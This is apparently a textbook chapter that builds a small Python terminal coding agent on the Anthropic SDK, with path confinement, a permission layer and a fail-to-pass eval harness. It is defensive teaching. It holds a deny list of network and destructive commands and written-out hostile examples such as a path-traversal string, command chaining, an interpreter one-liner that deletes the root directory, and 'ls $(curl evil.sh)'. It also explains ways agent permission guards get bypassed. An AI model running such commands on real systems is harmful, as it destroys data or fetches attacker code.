# Chapter 07 - Build Your Own Coding Agent

## What you will master

- A complete, runnable terminal coding agent in roughly 300 lines of Python: tool loop, bash, read, edit, write, permission prompts, transcript persistence, and compaction.
- The hardening pass that turns a demo into something you would let near a real repository: path-traversal guards, command allowlisting, output truncation, and a cost budget.
- A miniature SWE-bench-style evaluation harness: fixture tasks with fail-to-pass tests, a runner, and a scoring report.
- The instinct for which parts of your harness are capability scaffolding (keep) and which are model compensation (expect to delete).

Everything here targets the Anthropic Python SDK as of early 2026, with `claude-opus-4-8` as the default model.
The architecture is provider-neutral; only the client construction and the tool-block field names are Anthropic-specific.

## 1. Setup

```bash
mkdir mini-agent && cd mini-agent
python3 -m venv .venv && source .venv/bin/activate
pip install "anthropic>=0.60"
export ANTHROPIC_API_KEY=...     # or run: ant auth login
```

The agent is one file, `agent.py`.
It is presented in sections; concatenate them in order.

A deliberate omission worth naming: this agent does not enable extended thinking.
On Opus 4.8 and later, omitting the `thinking` parameter runs without thinking, which keeps the message-replay rules simple - thinking blocks must be echoed back unchanged across turns, and getting that wrong is the single most common bug in hand-rolled loops.
Section 6 shows how to turn it on once the loop is correct.

## 2. Tool definitions

Four tools, chosen using Chapter 2's promotion rule: bash for breadth, and three dedicated tools where the harness needs a typed hook (staleness invariant on edit, line numbering on read, overwrite protection on write).

```python
# agent.py  (part 1 of 6)
from __future__ import annotations

import json
import os
import shlex
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path

import anthropic

MODEL = "claude-opus-4-8"
MAX_TOKENS = 8000
MAX_OUTPUT_CHARS = 20_000          # per-tool result cap
ROOT = Path.cwd().resolve()        # the agent's sandbox root

TOOLS = [
    {
        "name": "bash",
        "description": (
            "Run a shell command in the project root and return combined "
            "stdout and stderr plus the exit code. Use for building, testing, "
            "searching (rg/grep), and inspecting the repository."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "The shell command to run."},
                "timeout": {"type": "integer", "description": "Seconds before the command is killed. Default 120."},
            },
            "required": ["command"],
        },
    },
    {
        "name": "read_file",
        "description": (
            "Read a UTF-8 text file. Returns the contents with 1-based line "
            "numbers prefixed, which you must use when reasoning about locations. "
            "Always read a file before editing it."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path relative to the project root."},
                "offset": {"type": "integer", "description": "1-based first line to return."},
                "limit": {"type": "integer", "description": "Maximum number of lines to return. Default 400."},
            },
            "required": ["path"],
        },
    },
    {
        "name": "edit_file",
        "description": (
            "Replace an exact string in a file. old_string must appear exactly "
            "once in the file, including whitespace; include surrounding context "
            "to disambiguate. Fails if the string is missing or ambiguous, or if "
            "the file has not been read in this session."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "old_string": {"type": "string"},
                "new_string": {"type": "string"},
            },
            "required": ["path", "old_string", "new_string"],
        },
    },
    {
        "name": "write_file",
        "description": (
            "Create a new file or overwrite an existing one with the given "
            "contents. Overwriting a file requires having read it first."
        ),
        "input_schema": {
            "type": "object",
            "properties": {"path": {"type": "string"}, "content": {"type": "string"}},
            "required": ["path", "content"],
        },
    },
]
```

Three ACI decisions in the descriptions are worth naming (Chapter 3, section 2).
`read_file` promises line numbers, so the model can talk about locations reliably.
`edit_file` states the exactly-once rule in the description rather than only enforcing it in code, so the model writes disambiguating context on the first attempt instead of learning it from an error.
Every tool's failure text will explain what to do next, not just what went wrong.

## 3. Tool execution and the safety layer

```python
# agent.py  (part 2 of 6)

class ToolError(Exception):
    """Recoverable: reported back to the model as an error tool_result."""


def resolve(path_str: str) -> Path:
    """Resolve a model-supplied path and confine it to ROOT."""
    p = (ROOT / path_str).resolve()
    if p != ROOT and ROOT not in p.parents:
        raise ToolError(
            f"path {path_str!r} escapes the project root; "
            "use a path inside the project."
        )
    return p


def clip(text: str) -> str:
    if len(text) <= MAX_OUTPUT_CHARS:
        return text
    half = MAX_OUTPUT_CHARS // 2
    omitted = len(text) - 2 * half
    return f"{text[:half]}\n\n... [{omitted} characters omitted] ...\n\n{text[-half:]}"


@dataclass
class Session:
    read_files: set[str] = field(default_factory=set)   # staleness tracking
    approved: set[str] = field(default_factory=set)     # always-allow rules
    spend_usd: float = 0.0
    budget_usd: float = 5.0
    headless: bool = False                              # no human to prompt


def tool_bash(args: dict, s: Session) -> str:
    command = args["command"]
    timeout = int(args.get("timeout", 120))
    proc = subprocess.run(
        command, shell=True, cwd=ROOT, capture_output=True, text=True,
        timeout=timeout, errors="replace",
    )
    out = (proc.stdout or "") + (proc.stderr or "")
    return clip(f"exit code: {proc.returncode}\n{out or '(no output)'}")


def tool_read_file(args: dict, s: Session) -> str:
    p = resolve(args["path"])
    if not p.is_file():
        raise ToolError(f"{args['path']} is not a file. Use bash with ls to explore.")
    offset = max(1, int(args.get("offset", 1)))
    limit = int(args.get("limit", 400))
    lines = p.read_text(encoding="utf-8", errors="replace").splitlines()
    s.read_files.add(str(p))
    window = lines[offset - 1: offset - 1 + limit]
    body = "\n".join(f"{offset + i:6d}\t{line}" for i, line in enumerate(window))
    tail = ""
    if offset - 1 + limit < len(lines):
        tail = f"\n\n[file has {len(lines)} lines; showing {offset}-{offset + len(window) - 1}]"
    return clip(body + tail)


def tool_edit_file(args: dict, s: Session) -> str:
    p = resolve(args["path"])
    if str(p) not in s.read_files:
        raise ToolError(f"read {args['path']} before editing it.")
    if not p.is_file():
        raise ToolError(f"{args['path']} does not exist; use write_file to create it.")
    text = p.read_text(encoding="utf-8")
    old, new = args["old_string"], args["new_string"]
    count = text.count(old)
    if count == 0:
        raise ToolError(
            "old_string not found. Re-read the file; whitespace and indentation "
            "must match exactly."
        )
    if count > 1:
        raise ToolError(
            f"old_string appears {count} times. Include more surrounding lines "
            "so it matches exactly once."
        )
    p.write_text(text.replace(old, new), encoding="utf-8")
    return f"edited {args['path']} (1 replacement)"


def tool_write_file(args: dict, s: Session) -> str:
    p = resolve(args["path"])
    if p.exists() and str(p) not in s.read_files:
        raise ToolError(f"{args['path']} exists; read it before overwriting.")
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(args["content"], encoding="utf-8")
    s.read_files.add(str(p))
    return f"wrote {args['path']} ({len(args['content'])} bytes)"


HANDLERS = {
    "bash": tool_bash,
    "read_file": tool_read_file,
    "edit_file": tool_edit_file,
    "write_file": tool_write_file,
}
```

Four safety properties are already present and each is a capability scaffold that will not decay:

- **Path confinement.** `resolve` canonicalizes before comparing, so `../../etc/passwd`, symlinks, and absolute paths are all caught by the same check.
Doing the check on the raw string instead is the classic vulnerable version.
- **Staleness invariant.** `edit_file` and overwrite refuse to act on a file the model has not read, which eliminates blind clobbering.
- **Output clipping.** A single `find /` must not consume the context window.
Clipping head and tail preserves the informative ends.
- **Recoverable errors.** `ToolError` becomes an error tool result, not a crash, so the model repairs and continues.

## 4. Permissions

```python
# agent.py  (part 3 of 6)

READ_ONLY_PREFIXES = (
    "ls", "cat", "head", "tail", "grep", "rg", "find", "wc", "git status",
    "git diff", "git log", "pwd", "which", "python --version", "pytest --collect-only",
)

DENY_SUBSTRINGS = (
    "rm -rf /", "mkfs", ":(){", "dd if=", "shutdown", "reboot",
    "git push", "curl", "wget", "nc ", "chmod 777",
)

# Extra commands the automation mode may run without a human: enough to build
# and test, nothing that reaches the network, rewrites history, or hands the
# model a bare interpreter it can type arbitrary code into.
AUTOMATION_PREFIXES = READ_ONLY_PREFIXES + (
    "pytest", "python -m pytest", "python3 -m pytest", "python -m unittest",
    "npm test", "npm run test", "make test", "make lint",
    "git add", "git commit",
)

OPERATOR_CHARS = set(";|&<>()")


def shell_operators(cmd: str) -> list[str]:
    """Operators the shell would act on, ignoring characters inside quotes."""
    if "\n" in cmd or "\r" in cmd:
        return ["newline"]      # shlex calls it whitespace; the shell does not
    lexer = shlex.shlex(cmd, punctuation_chars=True)
    lexer.whitespace_split = True
    try:
        tokens = list(lexer)
    except ValueError as exc:
        return [f"unparsable ({exc})"]      # fail closed on unbalanced quotes
    return [t for t in tokens if t and (set(t) <= OPERATOR_CHARS or "`" in t)]


def matches_prefix(cmd: str, prefixes: tuple[str, ...]) -> bool:
    """Prefix match on a token boundary, so `ls` does not admit `lsof`."""
    return any(cmd == p or cmd.startswith(p + " ") for p in prefixes)


def needs_approval(name: str, args: dict, s: Session) -> bool:
    if name == "read_file":
        return False
    if name == "bash":
        cmd = args["command"].strip()
        if any(bad in cmd for bad in DENY_SUBSTRINGS):
            raise ToolError(f"command blocked by policy: {cmd!r}")
        if cmd in s.approved:
            return False
        # Auto-allow single read-only commands with no shell chaining.
        if not shell_operators(cmd) and matches_prefix(cmd, READ_ONLY_PREFIXES):
            return False
        return True
    return f"{name}:{args.get('path', '')}" not in s.approved


def automation_decision(name: str, args: dict) -> tuple[bool, str]:
    """Decide without a human. Returns (allowed, reason-when-denied)."""
    if name != "bash":
        return True, ""     # confined to ROOT, and read-before-write still applies
    cmd = args["command"].strip()
    found = shell_operators(cmd)
    if found:
        return False, (f"shell operators ({', '.join(found)}) are not allowed in "
                       "headless mode; issue one command per bash call.")
    if not matches_prefix(cmd, AUTOMATION_PREFIXES):
        return False, (f"{cmd.split(' ')[0]!r} is not on the headless allowlist; "
                       "use the project's test or build commands, or re-run "
                       "the agent interactively.")
    return True, ""


def ask_permission(name: str, args: dict, s: Session) -> tuple[bool, str]:
    """Returns (allowed, reason-when-denied). Never blocks without a terminal."""
    key = (args["command"].strip() if name == "bash"
           else f"{name}:{args.get('path', '')}")
    if s.headless:
        return automation_decision(name, args)
    print(f"\n\033[33m[permission]\033[0m {name}")
    if name == "bash":
        print(f"  $ {args['command']}")
    else:
        print(f"  path: {args.get('path')}")
        if name == "edit_file":
            print(f"  - {args['old_string'][:200]}")
            print(f"  + {args['new_string'][:200]}")
    try:
        choice = input("  [y]es / [a]lways / [n]o + reason: ").strip().lower()
        if choice.startswith("a"):
            s.approved.add(key)
            return True, ""
        if choice.startswith("y"):
            return True, ""
        return False, input("  reason (optional): ").strip()
    except EOFError:
        return False, "no terminal is attached to approve this action."
```

This is Chapter 2's trust gradient in miniature: a deny list that cannot be overridden, an auto-allow tier for unambiguous read-only commands, an always-allow tier that learns rules within the session, an interactive fallback, and a non-interactive allowlist for when no human is present.

The chaining check matters more than it looks.
`ls` is safe; `ls && rm -rf build` starts with `ls` and is not.
Prefix matching on a string that may contain shell operators is exactly how permission systems get bypassed, so the auto-allow tier refuses anything the shell would read as an operator.
The tempting way to write that check is a substring scan over a list of operator strings, and it is wrong in both directions.
It misses operators, because the obvious list is incomplete: a bare newline chains commands just as well as `;`, so `ls -la\nrm -rf build` sails through a guard that checks only for `&&`, `||`, `;`, `|`, and `>`.
It also invents operators that are not there, because `rg 'foo|bar'` and `git commit -m "handle a || b"` carry those characters inside quotes, where the shell treats them as ordinary text.
Inventing them is not a harmless excess of caution: the system prompt tells the model to search with `rg`, and section 8 runs the agent with no human to overrule the guard, so a false denial lands on the scoreboard as a failed task.
So `shell_operators` tokenizes with `shlex` in punctuation mode, which understands quoting, and reports only the tokens that are made entirely of operator characters.
The newline case is settled before tokenizing, because `shlex` classifies a line break as whitespace while the shell classifies it as a command separator, and `.strip()` removes only the leading and trailing whitespace, not an embedded one.
Unbalanced quotes are reported as an operator as well, so a command the tokenizer cannot parse fails closed rather than open.
Backticks are checked directly because `shlex` has no notion of command substitution, while `$(...)` needs no special case: the parentheses tokenize on their own.
Both the auto-allow tier and the headless tier call that one function, so the two policies cannot drift apart.

The second half of the guard is the prefix test itself.
`cmd.startswith("ls")` is true of `lsof`, `lsblk`, and any binary whose name happens to begin with those two letters, so the match has to land on a token boundary: either the whole command or the prefix followed by a space.
Two lines of code, and without them the allowlist admits programs nobody put on it.

Note honestly what this still does not cover: `ls $(curl evil.sh)` is caught by the operator check, but a determined attacker with control of the model's input has a large search space, which is why the deny list, the path confinement, and - in real deployments - a container, all exist as layers rather than alternatives.

The headless branch exists because an interactive prompt is not a policy when nobody is at the terminal.
Calling `input()` from a process whose stdin is a closed pipe either blocks until the caller's timeout kills it or raises `EOFError` from inside the tool loop, and both outcomes look like an agent that mysteriously cannot finish.
So `ask_permission` consults `automation_decision` first: file writes are allowed because `resolve` confines them to `ROOT` and the read-before-edit invariant still holds, while bash is held to the same operator check plus an explicit allowlist wide enough to run the project's tests.
That allowlist stops deliberately short of a bare interpreter.
`python -m pytest` is on it and `python` is not, because `python -c "__import__('shutil').rmtree('/')"` is a shell wearing a costume, and a prefix that admits it makes the entire tier decorative.
The same reasoning keeps `make` off the list in favor of the specific targets a build is expected to use.
Anything outside it comes back as a readable denial the model can act on, which means the run always terminates with a result rather than hanging.
The `EOFError` guard on the interactive path is the same lesson applied to the case where a terminal disappears mid-session.

## 5. The agent loop, transcripts, and compaction

```python
# agent.py  (part 4 of 6)

SYSTEM = """You are a terminal coding agent working in the current project directory.

Workflow:
- Explore before you edit. Use bash with rg or grep to locate code, then read_file.
- Make the smallest change that solves the problem; follow existing conventions.
- Verify your work by running the project's tests before declaring completion.
- If a tool returns an error, read it carefully and adapt rather than retrying identically.

Output: be concise. This renders in a terminal. No preamble, no summary of what you
are about to do, no markdown headers. State results and next actions plainly.
"""

# Approximate list prices (USD per million tokens) for the default model.
# Re-check against current pricing; this exists to make spend visible, not exact.
# Cache writes bill above the base input rate, cache reads far below it.
PRICE_IN, PRICE_OUT = 5.0, 25.0
PRICE_CACHE_WRITE, PRICE_CACHE_READ = 6.25, 0.5

client = anthropic.Anthropic()


def record_cost(usage, s: Session) -> None:
    def tokens(name: str) -> int:
        return getattr(usage, name, 0) or 0

    s.spend_usd += (
        tokens("input_tokens") * PRICE_IN
        + tokens("cache_creation_input_tokens") * PRICE_CACHE_WRITE
        + tokens("cache_read_input_tokens") * PRICE_CACHE_READ
        + tokens("output_tokens") * PRICE_OUT
    ) / 1_000_000


def save_transcript(messages: list, path: Path = Path(".agent_transcript.json")) -> None:
    serializable = []
    for m in messages:
        content = m["content"]
        if not isinstance(content, str):
            content = [c if isinstance(c, dict) else c.model_dump() for c in content]
        serializable.append({"role": m["role"], "content": content})
    path.write_text(json.dumps(serializable, indent=2), encoding="utf-8")


def compact(messages: list, s: Session) -> list:
    """Summarize all but the last two turns into a single user message."""
    if len(messages) <= 6:
        return messages
    head, tail = messages[:-4], messages[-4:]
    resp = client.messages.create(
        model=MODEL,
        max_tokens=2000,
        system=(
            "Summarize this coding-agent transcript for a successor with no other "
            "context. Preserve: the original task and acceptance criteria, files "
            "read and changed, decisions made and rejected, commands run and their "
            "outcomes, and what remains to be done. Be specific; name files and "
            "symbols. Do not editorialize."
        ),
        messages=[{"role": "user", "content": json.dumps(
            [{"role": m["role"], "content": str(m["content"])[:4000]} for m in head]
        )}],
    )
    record_cost(resp.usage, s)
    summary = "".join(b.text for b in resp.content if b.type == "text")
    print("\033[90m[compacted history]\033[0m")
    return [{"role": "user", "content": f"[Summary of earlier work]\n{summary}"}] + tail


def run_turn(messages: list, s: Session, max_steps: int = 60) -> list:
    for _ in range(max_steps):
        if s.spend_usd > s.budget_usd:
            messages.append({"role": "user", "content":
                             "[harness] Budget exhausted. Stop and summarize state."})
        if sum(len(str(m["content"])) for m in messages) > 400_000:
            messages = compact(messages, s)

        resp = client.messages.create(
            model=MODEL, max_tokens=MAX_TOKENS, system=SYSTEM,
            tools=TOOLS, messages=messages,
        )
        record_cost(resp.usage, s)
        messages.append({"role": "assistant", "content": resp.content})

        for block in resp.content:
            if block.type == "text" and block.text.strip():
                print(block.text)

        if resp.stop_reason != "tool_use":
            save_transcript(messages)
            return messages

        results = []
        for block in resp.content:
            if block.type != "tool_use":
                continue
            try:
                if needs_approval(block.name, block.input, s):
                    allowed, reason = ask_permission(block.name, block.input, s)
                    if not allowed:
                        raise ToolError(f"action denied. {reason}".strip())
                print(f"\033[90m  -> {block.name} {json.dumps(block.input)[:120]}\033[0m")
                out = HANDLERS[block.name](block.input, s)
                results.append({"type": "tool_result", "tool_use_id": block.id,
                                "content": out})
            except ToolError as e:
                results.append({"type": "tool_result", "tool_use_id": block.id,
                                "content": f"Error: {e}", "is_error": True})
            except Exception as e:  # unexpected: still recoverable for the model
                results.append({"type": "tool_result", "tool_use_id": block.id,
                                "content": f"Error: {type(e).__name__}: {e}",
                                "is_error": True})

        messages.append({"role": "user", "content": results})
        save_transcript(messages)

    messages.append({"role": "user", "content": "[harness] Step limit reached."})
    return messages
```

Six details in this loop are where hand-rolled agents usually break.

- **Append the whole `resp.content`**, not extracted text.
Dropping `tool_use` blocks breaks the pairing the API requires on the next request.
- **One `tool_result` per `tool_use`, all in a single user message.**
Splitting them across messages is accepted but trains the model out of parallel tool calls; omitting one is a hard error.
- **Errors are results, not exceptions.**
`is_error: True` with a readable message is what lets the model recover.
- **Loop on `stop_reason == "tool_use"`**, not on a count of tool blocks; that is the API's own signal.
- **Save the transcript after every step**, so a crash or a Ctrl-C leaves a resumable artifact.
- **Compaction preserves intent.**
The summary prompt explicitly pins the original task and acceptance criteria, because a compaction that loses them is how agents confidently finish the wrong task (Chapter 3, section 7).

## 6. The entry point

```python
# agent.py  (part 5 of 6)

def main() -> None:
    headless = len(sys.argv) > 1 and sys.argv[1] == "-p"
    s = Session(headless=headless)
    if headless:
        # One task, no interaction: approval comes from automation_decision.
        task = " ".join(sys.argv[2:])
        run_turn([{"role": "user", "content": task}], s)
        print(f"\n[spend ${s.spend_usd:.3f}]")
        return

    print(f"mini-agent in {ROOT}  (model {MODEL}, budget ${s.budget_usd})")
    messages: list = []
    while True:
        try:
            user = input("\n\033[36m>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if user in {"exit", "quit"}:
            break
        if user == "/cost":
            print(f"spend ${s.spend_usd:.3f} / ${s.budget_usd}")
            continue
        if user == "/compact":
            messages = compact(messages, s)
            continue
        if not user:
            continue
        messages.append({"role": "user", "content": user})
        messages = run_turn(messages, s)
    print(f"[spend ${s.spend_usd:.3f}]  transcript: .agent_transcript.json")


if __name__ == "__main__":
    main()
```

Run it:

```bash
python agent.py                                  # interactive
python agent.py -p "add a docstring to utils.py" # headless, scriptable
```

**Turning on thinking.**
Once the loop is correct, add `thinking={"type": "adaptive"}` and `output_config={"effort": "high"}` to the `messages.create` call.
The one rule you must then honor: the `thinking` blocks in `resp.content` are already appended verbatim by the code above, and they must stay unmodified across turns.
Do not filter the assistant content to "just the useful blocks" - that is the mistake this design already avoids by appending `resp.content` wholesale.

## 7. Hardening for real use

The 300-line version is honest about being a demo.
Four upgrades separate it from something you would point at a repository you care about.

**Containerize.**
The strongest control is not in Python.
Run the agent inside a container with the repository mounted, a non-root user, a read-only root filesystem outside the workspace, no credentials in the environment, and default-deny egress.
Then `--dangerously-skip-permissions`-style autonomy becomes defensible, because the blast radius is the container.
Every guard in section 3 is defense in depth *behind* this, not a substitute for it.

**Finish the allowlist.**
Deny lists lose to creativity.
The headless path inverts it already, rejecting shell operators outright and requiring a token-boundary match against `AUTOMATION_PREFIXES`, which is why the same harness can offer a permissive interactive mode and a strict automation mode.
Two gaps remain, and both are about arguments rather than programs.
The first is flag and path validation: `pytest` is on the list, and `pytest --rootdir=/` is on the list too.
The second is indirection: `make test` and `npm run test` run whatever the repository's `Makefile` and `package.json` define, and the agent can edit both, so a program on the allowlist can still execute code the allowlist never inspected.
Parse the command, bind each allowed program to a schema for its flags and paths, reject anything that resolves outside `ROOT`, and treat the build definitions as protected files the agent may not rewrite mid-run.
Then consider holding the interactive mode to the same allowlist, treating the prompt as a way to widen it for one command rather than as the only thing standing between the model and the shell.

**Handle API failure properly.**
Wrap `messages.create` with typed exception handling - `anthropic.RateLimitError` and `anthropic.InternalServerError` warrant backoff and retry, `anthropic.BadRequestError` usually means your message construction is wrong and retrying will not help - and stream for long outputs so you do not hit request timeouts.

**Make the budget a real gate.**
The version above appends a warning message; a production gate raises and terminates, and reports cost per task to a metrics sink.
Better still, use a declared task budget the model is aware of so it paces itself and wraps up gracefully rather than being cut off mid-edit.

Two more worth adding when the agent runs unattended: a **git checkpoint** before the first mutation so any run can be reverted with one command, and **structured logging** of every tool call with its arguments and outcome, which is the only way to debug a run you did not watch.

## 8. Evaluating it

An agent you have not measured is an agent you have opinions about.
Build the smallest honest eval: SWE-bench's structure (Chapter 3) at fixture scale.

Each task is a directory with broken source and a test that fails before the fix and passes after.

```
eval/
  tasks/
    off_by_one/
      repo/calc.py          # contains the bug
      repo/test_calc.py     # fails now, passes after the fix
      task.json             # {"prompt": "...", "test_cmd": "pytest -q"}
    missing_validation/
    wrong_sort_key/
```

```python
# eval/run_eval.py
import json, shutil, subprocess, sys, tempfile, time
from pathlib import Path

TASKS = Path(__file__).parent / "tasks"
AGENT = Path(__file__).resolve().parents[1] / "agent.py"


def run_task(task_dir: Path) -> dict:
    spec = json.loads((task_dir / "task.json").read_text())
    with tempfile.TemporaryDirectory() as tmp:
        work = Path(tmp) / "repo"
        shutil.copytree(task_dir / "repo", work)

        # 1. Confirm the test fails before the agent runs (fail-to-pass precondition).
        before = subprocess.run(spec["test_cmd"], shell=True, cwd=work,
                                capture_output=True, text=True)
        if before.returncode == 0:
            return {"task": task_dir.name, "status": "INVALID",
                    "note": "test passes before the fix"}

        # 2. Run the agent headless with a wall-clock cap.
        t0 = time.time()
        try:
            proc = subprocess.run([sys.executable, str(AGENT), "-p", spec["prompt"]],
                                  cwd=work, capture_output=True, text=True, timeout=900)
        except subprocess.TimeoutExpired:
            return {"task": task_dir.name, "status": "TIMEOUT",
                    "seconds": round(time.time() - t0, 1)}
        elapsed = round(time.time() - t0, 1)

        # 3. Score by running the hidden test the agent was never told to satisfy.
        after = subprocess.run(spec["test_cmd"], shell=True, cwd=work,
                               capture_output=True, text=True)

        # 4. Reward-hacking check: the agent must not have modified the test file.
        tampered = any(
            (work / f).read_bytes() != (task_dir / "repo" / f).read_bytes()
            for f in spec.get("protected_files", [])
        )
        status = ("TAMPERED" if tampered
                  else "RESOLVED" if after.returncode == 0
                  else "FAILED")
        return {"task": task_dir.name, "status": status, "seconds": elapsed,
                "agent_tail": proc.stdout[-400:]}


def main() -> None:
    results = [run_task(d) for d in sorted(TASKS.iterdir()) if d.is_dir()]
    resolved = sum(r["status"] == "RESOLVED" for r in results)
    for r in results:
        print(f"{r['status']:<9} {r['task']:<24} {r.get('seconds', '-')}s")
    print(f"\nresolved {resolved}/{len(results)} "
          f"({100 * resolved / max(1, len(results)):.0f}%)")


if __name__ == "__main__":
    main()
```

Four properties make this a real eval rather than a vibe check, and all four come straight from SWE-bench's design:

- **Fail-to-pass precondition.** Verifying the test fails first catches broken fixtures, which are the most common reason a homemade eval reports inflated scores.
- **Hidden test.** The prompt describes the symptom; the test defines success and is never shown to the agent.
- **Fresh copy per run.** Copying to a temp directory means runs cannot contaminate each other and a destructive agent cannot damage the fixture.
- **Tamper detection.** `protected_files` catches the agent that "fixes" the bug by editing the test - Chapter 1's reward hacking, made concrete.

One coupling to keep in mind: the harness runs the agent with `-p`, so every command the agent needs in order to verify its own work has to be on `AUTOMATION_PREFIXES`.
If a fixture's `test_cmd` is `npm run test:unit`, the token-boundary match against `npm run test` does not cover it, so the agent is denied its verification step and the task scores FAILED for a policy reason rather than a capability one.
Widen `AUTOMATION_PREFIXES` to cover every fixture's test command, and copy `.agent_transcript.json` out of the temp directory before the run tears it down, because the denial text lands in a tool result and a scoreboard that cannot distinguish a policy denial from a real failure is measuring your allowlist rather than your agent.

What to do with the numbers.
Run each task at least three times, because agent runs are stochastic and a single pass tells you almost nothing; report resolved-fraction with the variance, plus median wall-clock and cost.
Then use the eval as a regression harness: every prompt change, tool change, or model change gets re-measured against the same fixtures.
That loop - change something, re-run the eval, keep it only if the number moved - is the difference between engineering an agent and decorating one.

Finally, apply Chapter 3's scaffold-decay test to your own creation.
The path confinement, permission layer, budget, transcript persistence, and eval harness are capability scaffolding: models will not grow the ability to sandbox themselves, and these should be built well.
The elaborate workflow prescriptions in the system prompt, the compaction summary schema, and any voting or retry logic you add are model compensation: measure them, and expect to delete some of them a generation from now.
Knowing which half of your own code you expect to throw away is the mark of someone who understands the field rather than the tool.

## Exercises

1. Type the agent in, run it on a real repository, and complete three tasks: a one-line bug fix, adding a test, and a two-file refactor; record how many permission prompts you answered and which ones you would auto-allow permanently.
2. Break the loop deliberately in four ways - drop `tool_use` blocks from the appended assistant message, return only one result for two tool calls, raise instead of returning an error result, and loop on tool-block count instead of `stop_reason` - and record the exact failure each produces so you recognize them in the wild.
3. Add a `grep` tool that wraps ripgrep with a result cap and a clear too-many-results message; measure task completion on your eval before and after, and state whether it was capability or compensation.
4. Add an argument validator on top of the headless allowlist and hold the interactive mode to the same policy, then write ten adversarial commands attempting to escape it; report how many succeeded and fix the ones that did.
5. Build five eval tasks from real bugs in your own git history: use the pre-fix commit as the fixture and the test added in the fixing commit as the hidden test; run the agent three times per task and report resolved-fraction with variance.
6. Implement compaction two ways - the summary above, and simple truncation that keeps the first and last N messages - and measure resolved-fraction and token cost on a long task; state which lost more.
7. Add adaptive thinking with `effort` set to `low`, `high`, and `xhigh`, and produce a table of resolved-fraction, cost, and wall-clock per level; pick the setting you would ship and defend it.
8. Containerize the agent with a non-root user, mounted workspace, and default-deny egress; then run it with permissions bypassed on your eval and argue whether that configuration is now defensible.

## Godhood check

You have mastered this chapter when you can:

- Write the agent loop from memory, including appending full assistant content, pairing every tool result, batching results in one user message, and looping on `stop_reason`.
- Explain each safety property in the tool layer - path confinement after canonicalization, the read-before-edit staleness invariant, output clipping, recoverable tool errors - and the specific bug each prevents.
- Justify the exactly-once edit semantics and the line-numbered read format on ACI grounds without appealing to convention.
- Describe the permission gradient you implemented, explain why prefix matching on chained commands is unsafe, name the operators an incomplete guard misses, and state why the container is the real control.
- Explain why an interactive prompt is not a policy for an unattended run, and what your harness does instead when no terminal is attached.
- Write a compaction prompt that preserves task intent and say what breaks when it does not.
- Build a fail-to-pass eval harness from scratch, name its four integrity properties, and explain why tamper detection is not optional.
- Sort every component of your own harness into capability scaffolding or model compensation and defend each placement.
